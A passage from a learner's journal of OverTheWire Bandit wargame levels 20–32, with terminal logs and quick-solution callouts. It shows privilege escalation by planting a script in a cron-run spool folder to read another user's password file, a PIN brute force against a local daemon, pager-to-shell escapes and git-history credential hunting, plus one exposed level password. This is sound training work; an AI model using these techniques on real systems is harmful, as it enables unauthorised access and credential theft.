2232/tcp  open  ivs-video
4091/tcp  open  ewinstaller
4258/tcp  open  vrml-multi-use
4321/tcp  open  rwhois
5842/tcp  open  reversion
8000/tcp  open  http-alt
30000/tcp open  ndmps
30001/tcp open  pago-services1
30002/tcp open  pago-services2
31046/tcp open  unknown
31518/tcp open  unknown
31691/tcp open  unknown
31790/tcp open  unknown
31960/tcp open  unknown
50001/tcp open  unknown
51790/tcp open  unknown
60917/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 3.56 seconds
bandit20@bandit:~$ 
```
Now running `./suconnect` on all these open and unknown ports;
Well, in previous session i tried passing all these ports into some commands, and none worked, i forgot to journal them. but Lets think of a way. Lets go through the question again.

SO this setuid binary `suoconnect` connects to localhost on a certain port i have the specify. Then it checks against the lvl 20 pwd and if correct i passes me the pwd for lvl 21. But one question:

>Do i send the password along with the connection request ?

And honestly i dont even understand these new commands. 
Let me pullup the open ports on my terminal again. I have like no direction on what to move forward to: 
i know what you can send content/file to a "server" ? through nc, so like i send lvl 20 pwd along with port? and bruteforce it for 8 open and unknown ports ? 
But yesterday several ais said something about listening and checking connection. 
Through several convo's with chatgpt here are the steps i am trying out right now: 
- Choose a TCP port that is available on the Bandit server.
- Start a listener on that port.
- Make sure the listener is ready before doing anything else.
- Run `suconnect` and tell it to connect to that same port.
- When the connection is established, send the previous level's password as a line of text.
- Observe what `suconnect` returns.

Well i tried starting a listen on 31046 port but it says
```bash
bandit20@bandit:~$ nc -l 31046
nc: Address already in use
bandit20@bandit:~$
```

What the fuck is this ?
How were people supposed to solve this without AI or teacher? how did people self learn all this ? fuckk me

Well i got it to work finally:
so, first you spinup a listener on a new port with
`nc -l portnumber`
then in another terminal you use the setuid binary to connect to that terminal through
`suconnect portnumber`

And since you have to passup the previous level password to suoconnect, and suconnect listens to what the specifed port says, we pass the password through `echo " " | nc -l 23456`
This in the listener tab, it gave me the password. This was hard

> [!tip] Quick Solution
> You need to be both the server *and* the client — spin up your own listener that holds the password, then point `suconnect` at it:
> ```bash
> # In one terminal (or backgrounded with &):
> echo "<bandit20_password>" | nc -l -p 23456 &
>
> # Then in the same (or another) terminal:
> ./suconnect 23456
> ```
> `suconnect` connects to your listener, reads the password, verifies it's correct, and sends back the bandit21 password.

---
## **Level 22**
>A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

 Commands you may need to solve this level
cron, crontab, crontab(5) (use “man 5 crontab” to access this)

so running `man cron`
I do not understand this level at all, no instruction on how to get the password, or like which file to work with ?
like
```bash
bandit21@bandit:~$ cd /etc/cron.d/
bandit21@bandit:/etc/cron.d$ ls -la
total 56
drwxr-xr-x   2 root root  4096 Sep 27 06:51 .
drwxr-xr-x 128 root root 12288 Oct 16 14:15 ..
-rw-r--r--   1 root root   102 Nov  5  2025 .placeholder
-r--r-----   1 root root    47 Sep 26 21:55 behemoth4_cleanup
-rw-r--r--   1 root root   127 Sep 27 06:51 clean_tmp
-rw-r--r--   1 root root   120 Sep 26 21:54 cronjob_bandit22
-rw-r--r--   1 root root   122 Sep 26 21:54 cronjob_bandit23
-rw-r--r--   1 root root   120 Sep 26 21:54 cronjob_bandit24
-rw-r--r--   1 root root   188 Feb 13  2026 e2scrub_all
-r--r-----   1 root root    48 Sep 26 21:56 leviathan5_cleanup
-rw-------   1 root root   138 Sep 26 21:56 manpage3_resetpw_job
-rwx------   1 root root    52 Sep 26 21:58 otw-tmp-dir
bandit21@bandit:~$ crontab -e
crontabs/bandit21/: fdopen: Permission deniedbandit21@bandit:~$
bandit21@bandit:~$ crontab -l
crontabs/bandit21/: fopen: Permission denied
bandit21@bandit:~$ systemctl status cron
● cron.service - Regular background program processing daemon
     Loaded: loaded (/usr/lib/systemd/system/cron.service; enabled; preset: enabled)
     Active: active (running) since Fri 2026-10-16 14:15:05 UTC; 1 day 21h ago
 Invocation: <i hope whatever was here was the password but letme try>
       Docs: man:cron(8)
   Main PID: 646
      Tasks: 1 (limit: 3736)
     Memory: 2M (peak: 30.5M)
        CPU: 58min 31.356s
     CGroup: /system.slice/cron.service
             └─646 /usr/sbin/cron -f -P
bandit21@bandit:~$
bandit21@bandit:~$ ls /etc/cron.d/
behemoth4_cleanup  cronjob_bandit22  cronjob_bandit24  leviathan5_cleanup    otw-tmp-dir
clean_tmp          cronjob_bandit23  e2scrub_all       manpage3_resetpw_job
bandit21@bandit:~$ cat /etc/cron.d/cronjob_bandit22
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
bandit21@bandit:~$ cat /usr/bin/cronjob_bandit22.sh
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
bandit21@bandit:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
<pwd here>
```
well this was intresting, i am kinda dumb and not made for investigation
I got into level 23

> [!tip] Quick Solution
> The cron job for bandit22 runs every minute and writes the password to a world-readable temp file. You don't need to wait — it's already there:
> ```bash
> cat /usr/bin/cronjob_bandit22.sh       # read the script to find the tmp path
> cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
> ```

---
## **Level 23**
>A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.
>
**NOTE:** Looking at shell scripts written by other people is a very useful skill. The script for this level is intentionally made easy to read. If you are having problems understanding what it does, try executing it to see the debug information it prints.


Well, this was easy enough:
```bash
bandit22@bandit:~$ ls /etc/cron.d/
behemoth4_cleanup  cronjob_bandit22  cronjob_bandit24  leviathan5_cleanup    otw-tmp-dir
clean_tmp          cronjob_bandit23  e2scrub_all       manpage3_resetpw_job
bandit22@bandit:~$ ls -la /etc/cron.d/
total 56
drwxr-xr-x   2 root root  4096 Sep 27 06:51 .
drwxr-xr-x 128 root root 12288 Oct 16 14:15 ..
-rw-r--r--   1 root root   102 Nov  5  2025 .placeholder
-r--r-----   1 root root    47 Sep 26 21:55 behemoth4_cleanup
-rw-r--r--   1 root root   127 Sep 27 06:51 clean_tmp
-rw-r--r--   1 root root   120 Sep 26 21:54 cronjob_bandit22
-rw-r--r--   1 root root   122 Sep 26 21:54 cronjob_bandit23
-rw-r--r--   1 root root   120 Sep 26 21:54 cronjob_bandit24
-rw-r--r--   1 root root   188 Feb 13  2026 e2scrub_all
-r--r-----   1 root root    48 Sep 26 21:56 leviathan5_cleanup
-rw-------   1 root root   138 Sep 26 21:56 manpage3_resetpw_job
-rwx------   1 root root    52 Sep 26 21:58 otw-tmp-dir
bandit22@bandit:~$ cat /etc/cron.d/cronjob_bandit23
@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

cat /etc/bandit_pass/$myname > /tmp/$mytarget
bandit22@bandit:~$ cat /etc/bandit_pass/bandit23
cat: /etc/bandit_pass/bandit23: Permission denied

bandit22@bandit:~$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
8ca319486bfbbc3663ea0fbe81326349
bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
<pwd here>

```

> [!tip] Quick Solution
> The cron script copies the password to `/tmp/<md5hash>`. Run the same md5 command the script uses — but with `bandit23` as the username — to calculate the exact filename:
> ```bash
> echo I am user bandit23 | md5sum | cut -d ' ' -f 1
> cat /tmp/<hash from above>
> ```

---
## **Level 24**
>A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.
>
>**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!
>
>**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

Well, this seems complex enough
So like after running a few commands, i was lead to this file
```bash
cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

shopt -s nullglob

myname=$(whoami)

cd /var/spool/"$myname"/foo || exit
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." ] && [ "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" "./$i")"
        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
            timeout -s 9 60 "./$i"
        fi
        rm -rf "./$i"
    fi
done
```
Apparently rhis makes it so that anything i am able to write into that folder will run with permission from bandit24, but i am bandit23. So i need it to copy the bandit24 password . Thats why we need to make our own script.
So the script should move the file from bandit_pass/bandit24 into like tmp, so il will start by
```bash
bandit23@bandit:/tmp/tmp.v3cDVDD0VA$ echo "cat /etc/bandit_pass/bandit24 > /tmp/tmp.v3cDVDD0VA/pass.txt" > exploit.sh
bandit23@bandit:/tmp/tmp.v3cDVDD0VA$ chmod +x exploit.sh
bandit23@bandit:/tmp/tmp.v3cDVDD0VA$ cp exploit.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/tmp.v3cDVDD0VA$ la -la
total 8
drwxrwxrwx  2 bandit23 bandit23   80 Oct 18 12:00 .
drwxrwx-wt 75 root     root     1760 Oct 18 12:00 ..
-rwxrwxr-x  1 bandit23 bandit23   61 Oct 18 11:59 exploit.sh
-rw-rw-r--  1 bandit24 bandit24   33 Oct 18 12:00 pass.txt
bandit23@bandit:/tmp/tmp.v3cDVDD0VA$ cat pass.txt
<pwd here>
```

So, since the vulnerabiltiy was that any file with owner bandit23 will run with bandit24's permissions. I just copied the bandit24 password file into a pass.txt file in a mktemp -d temp folder and got the command.

> [!tip] Quick Solution
> Drop-write-wait: create a script that copies the bandit24 password to your temp dir, drop it in `/var/spool/bandit24/foo`, make it executable, then wait a minute for cron to run it:
> ```bash
> TMPDIR=$(mktemp -d)
> echo "cat /etc/bandit_pass/bandit24 > $TMPDIR/pass.txt" > $TMPDIR/exploit.sh
> chmod +x $TMPDIR/exploit.sh
> chmod o+w $TMPDIR           # make dir writable so bandit24 can write pass.txt
> cp $TMPDIR/exploit.sh /var/spool/bandit24/foo/
> # wait ~60 seconds, then:
> cat $TMPDIR/pass.txt
> ```

---
## **Level 25**
>A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.  
You do not need to create new connections each time

so like there should be a readymade linux command to bruteforce all possible 10000 combinations somenow, and i just give it the password for bandit24, or do i create a script ?
Well script it is:

```bash
bandit24@bandit:~$ for i in {0000..9999}; do
>     echo "<old pwd here> $i"
> done > guesses.txt
-bash: guesses.txt: Permission denied
bandit24@bandit:~$ mktemp -d
/tmp/tmp.HkBB0EXRQ6
bandit24@bandit:~$ cd /tmp/tmp.HkBB0EXRQ6
bandit24@bandit:/tmp/tmp.HkBB0EXRQ6$ for i in {0000..9999}; do     echo "hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv $i"; done > guesses.txt
bandit24@bandit:/tmp/tmp.HkBB0EXRQ6$ dir
guesses.txt
bandit24@bandit:/tmp/tmp.HkBB0EXRQ6$ cat guesses.txt | nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct current password and pincode. Try again.
...............
Wrong! Please enter the correct current password and pincode. Try again.
Correct!
The password of user bandit25 is <pwd here>
```
Well i was able to get into the next level.

> [!tip] Quick Solution
> Generate all 10000 guesses with a bash for loop and pipe the whole file into `nc` in one shot — the daemon handles multiple lines without re-connecting:
> ```bash
> TMPDIR=$(mktemp -d) && cd $TMPDIR
> for i in {0000..9999}; do echo "<bandit24_password> $i"; done > guesses.txt
> cat guesses.txt | nc localhost 30002 | grep -v Wrong
> ```

---
## **Level 26**

> Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not **/bin/bash**, but something else. Find out what it is, how it works and how to break out of it.

> NOTE: if you're a Windows user and typically use Powershell to `ssh` into bandit: Powershell is known to cause issues with the intended solution to this level. You should use command prompt instead.

```bash
bandit25@bandit:~$ dir
bandit26.sshkey
bandit25@bandit:~$ pwd
/home/bandit25
bandit25@bandit:~$ cat bandit26.sshkey
-----BEGIN OPENSSH PRIVATE KEY-----
-----END OPENSSH PRIVATE KEY-----
bandit25@bandit:~$ file bandit26.sshkey
bandit26.sshkey: OpenSSH private key
bandit25@bandit:~$ ls -la bandit26.sshkey
-r-------- 1 bandit25 bandit25 2602 Sep 26 21:54 bandit26.sshkey
bandit25@bandit:~$
```

Why cant i just use the scp command to get it into my local device and get into as bandit26? and what does it mean by shell for bandit26 is not in /bin/bash what does that mean ?
Well this means that it runs some text file using more and it will kick me out. And it kicked me out, but doesnot show any text file so i am stuck btw i did all these

```bash

bandit25@bandit:~$ cat /etc/passwd | grep bandit26
bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
bandit25@bandit:~$ cat /usr/bin/showtext
#!/bin/sh
export TERM=linux
exec more ~/text.txt
exit 0
bandit25@bandit:~$ exit
logout
Connection to bandit.labs.overthewire.org closed.
[user@local ~]$ ssh -i /tmp/bandit26.sshkey -p 2220 bandit26@bandit.labs.overthewire.org
[user@local ~]$ ssh -i /tmp/bandit26.sshkey -p 2220 bandit26@bandit.labs.overthewire.org
[user@local ~]$ ssh -i /tmp/bandit26.sshkey -p 2220 bandit26@bandit.labs.overthewire.org
[user@local ~]$ chmod 600 /tmp/bandit26.sshkey 
[user@local ~]$ ssh -i /tmp/bandit26.sshkey -p 2220 bandit26@bandit.labs.overthewire.org


 | |                   | (_) | |__ \ / /  
 | |__   __ _ _ __   __| |_| |_   ) / /_  
 | '_ \ / _` | '_ \ / _` | | __| / / '_ \ 
 | |_) | (_| | | | | (_| | | |_ / /| (_) |
 |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/ 
[user@local ~]$ cat /tmp/bandit26.sshkey 
-----BEGIN OPENSSH PRIVATE KEY-----
key here
-----END OPENSSH PRIVATE KEY-----
[user@local ~]$ 
```

So i ran a a few commands and did some trick so ill ask ai to compile them but i fot into next elvel

> [!note] Debugging: Why did I get kicked out instantly? (The "No Text" Issue)  
> When you log in, the `showtext` script runs `more ~/text.txt`. The text file is very short (only 4-5 lines). If your terminal window is large (e.g., 20+ lines tall), `more` prints the entire file instantly, hits the end, and the script executes `exit 0`. The connection dies before your eyes can even focus on the text. You do not see an error; it just flashes and closes.

> [!tip] Quick Solution & Key Lessons (The "Tiny Window / Vi" Trick)  
> **1. Force `more` to pause by tricking it into thinking the screen is tiny.**  
> You must make your terminal window tiny (drag the edge so it's 3-4 lines tall) OR use the `stty` command to force the server to see a tiny screen. (If your GUI prevents shrinking the window enough, `stty rows 2` is the bulletproof method).
> 
> **2. Break out of `more` into `vi`.**  
> When `more` pauses (showing `--More--` or `:`), press the **`v`** key. This tells `more` to open the current file in the `vi` text editor.
> 
> **3. Spawn a shell from inside `vi`.**  
> Once inside `vi`, you can execute shell commands. Type these exact commands (you might not see what you're typing if the window is tiny, but it will work):
> 
> vim
> 
> :set shell=/bin/bash
> 
> _(Press Enter)_
> 
> vim
> 
> :shell
> 
> _(Press Enter)_
> 
> **4. Grab the password.**  
> You now have a bash prompt running as `bandit26`. Resize your terminal back to normal, and run:
> 
> bash
> 
> cat /etc/bandit_pass/bandit26
> 
> **Takeaway:** This is a classic Linux privilege escalation technique. Pagers (`more`, `less`) can often launch text editors (`vi`, `vim`), and text editors can launch shells. Always check [GTFOBins](https://gtfobins.github.io/) for these escape techniques.

---
## **Level 27**
>Good job getting a shell! Now hurry and grab the password for bandit27!

Wtf does this mean ??????????????????????

wtf?

> [!tip] Quick Solution
> Level 27's "objective" is just staying inside `vi` after the Level 26 escape — you should already be in a shell as bandit26. From there, just read the password file:
> ```bash
> cat /etc/bandit_pass/bandit27
> ```

---
## **Level 28**
>There is a git repository at `ssh://bandit27-git@bandit.labs.overthewire.org/home/bandit27-git/repo` via the port `2220`. The password for the user `bandit27-git` is the same as for the user `bandit27`.

>From your local machine (not the OverTheWire machine!), clone the repository and find the password for the next level. This needs git installed locally on your machine.


Since it wants me to do it on my device, here it is:
```bash
git clone ssh://bandit27-git@bandit.labs.overthewire.org:2220/home/bandit27-git/repo
```
then i got the repo, so i looked into it with ls -la and found a README and it had the password.

> [!tip] Quick Solution
> Clone the repo and check the README:
> ```bash
> git clone ssh://bandit27-git@bandit.labs.overthewire.org:2220/home/bandit27-git/repo
> cat repo/README
> ```

---
## **Level 28**
>There is a git repository at `ssh://bandit28-git@bandit.labs.overthewire.org/home/bandit28-git/repo` via the port `2220`. The password for the user `bandit28-git` is the same as for the user `bandit28`.

From your local machine (not the OverTheWire machine!), clone the repository and find the password for the next level. This needs git installed locally on your machine.
```bash
dibij@Dibij:~/projects/CyberSecurity-Learning$ git clone ssh://bandit28-git@bandit.labs.overthewire.org:2220/home/bandit28-git/repo
Cloning into 'repo'...
                         _                     _ _ _   
                        | |__   __ _ _ __   __| (_) |_ 
                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_ 
                        |_.__/ \__,_|_| |_|\__,_|_|\__|
                                                       

                      This is an OverTheWire game server. 
            More information on http://www.overthewire.org/wargames

backend: gibson-0
bandit28-git@bandit.labs.overthewire.org's password: 
remote: Enumerating objects: 9, done.
remote: Counting objects: 100% (9/9), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 9 (delta 2), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (9/9), done.
Resolving deltas: 100% (2/2), done.
dibij@Dibij:~/projects/CyberSecurity-Learning$ ls -la repo
total 4
drwxr-xr-x 1 dibij dibij  248 Oct 18 19:29 .
drwxr-xr-x 1 dibij dibij 4096 Oct 18 19:29 ..
drwxr-xr-x 1 dibij dibij  448 Oct 18 19:29 .git
-rwxr-xr-x 1 dibij dibij  111 Oct 18 19:29 README.md
dibij@Dibij:~/projects/CyberSecurity-Learning/repo$ cat README.md 
# Bandit Notes
Some notes for level29 of bandit.

## credentials

- username: bandit29
- password: xxxxxxxxxx

dibij@Dibij:~/projects/CyberSecurity-Learning/repo$ 


```
now what the fuck is this ??
well i got the password by running
```bash
git log
```
in this hash `ad8a5f812f24e793d2657f926f503a2fd1c5e256` i got the pwd.

> [!tip] Quick Solution
> The README shows a redacted password. Look in the git history — a previous commit may have had the real value:
> ```bash
> git log --oneline
> git show <commit-hash>
> ```

---
## **Level 29**
>There is a git repository at `ssh://bandit29-git@bandit.labs.overthewire.org/home/bandit29-git/repo` via the port `2220`. The password for the user `bandit29-git` is the same as for the user `bandit29`.
>From your local machine (not the OverTheWire machine!), clone the repository and find the password for the next level. This needs git installed locally on your machine.

Well i again forgot to document, but this time i learned how to use git show and git log and switch between branches and be mindful of git branch and git switch and red herrings and so on...

> [!tip] Quick Solution
> The password is hidden on a non-default branch. Check all branches and switch:
> ```bash
> git branch -a          # list all branches including remotes
> git switch <branch>    # or: git checkout origin/<branch>
> git log --oneline      # check commit messages for clues
> git show <hash>        # inspect a specific commit
> ```

---
## **Level 30**
>There is a git repository at `ssh://bandit30-git@bandit.labs.overthewire.org/home/bandit30-git/repo` via the port `2220`. The password for the user `bandit30-git` is the same as for the user `bandit30`.
>From your local machine (not the OverTheWire machine!), clone the repository and find the password for the next level. This needs git installed locally on your machine.

well you can aaprently hide secrets in tags too and you can view them by `git tag` and `git show <tag name>`

> [!tip] Quick Solution
> Secrets can be stashed in git tags (not visible in normal `git log`):
> ```bash
> git tag              # list all tags
> git show <tagname>   # reveal the tag's stored content
> ```

---
## **Level 31**
>There is a git repository at `ssh://bandit31-git@bandit.labs.overthewire.org/home/bandit31-git/repo` via the port `2220`. The password for the user `bandit31-git` is the same as for the user `bandit31`.
>
From your local machine (not the OverTheWire machine!), clone the repository and find the password for the next level. This needs git installed locally on your machine.

Again seems like the same thing, and i am gonna learn something new

This asks you to use the -f tag in `git add -f filename` to force a file to be pushed even if its inside .gitignore.
Well done.

> [!tip] Quick Solution
> The repo's `.gitignore` blocks the file you need to push. Override it with `-f`:
> ```bash
> echo "May I come in?" > key.txt
> git add -f key.txt
> git commit -m "send key"
> git push origin master
> ```

---
## **Level 32**
>After all this `git` stuff, it's time for another escape. Good luck!

Now what thsi fucker mean ??
it made me write `$0` to get into another shell and work it oout

> [!tip] Quick Solution
> You're in an "uppercase shell" that converts all input to uppercase, breaking commands. `$0` is a special shell variable that expands to the name of the current shell — typing it runs a new shell, escaping the restriction:
> ```
> $0
> ```
> You now have a normal shell. From there, read the password and you're done.

---

> [!note] 🎉 BANDIT COMPLETE
> Finished all 33 Bandit levels (0–32). The whole wargame is done.

---

## Current Position

**Last completed:** Bandit Level 32 — ALL LEVELS COMPLETE ✅

**Total levels solved:** 33 (Level 0 through Level 32)

**Bandit is done. Next up:** [[PortSwigger]] Web Security Academy (XSS track)

**Learning approach:** Attempt each challenge independently before consulting walkthroughs.

**Related sessions:**
- [[2026-10-18 - Bandit Session 3]] — Session 006 (Levels 21–32: Cron, scripts, brute-force, vi escape, git forensics, $0 shell escape)
- [[2026-10-17 - Bandit Session 2]] — Session 005 (Levels 15–20: SSL/TLS, nmap port scan, diff -y, .bashrc bypass, setuid)
- [[2026-10-17 - Bandit - Session]] — Session 004 (SSH keys, chmod 600, scp)
- [[2026-10-17 - DNS - Session]] — Session 003 (DNS caching, latency, resolvectl)
- [[2026-10-16 - Cybersecurity Learning Session]] — Session 002 (Bandit 9–13)

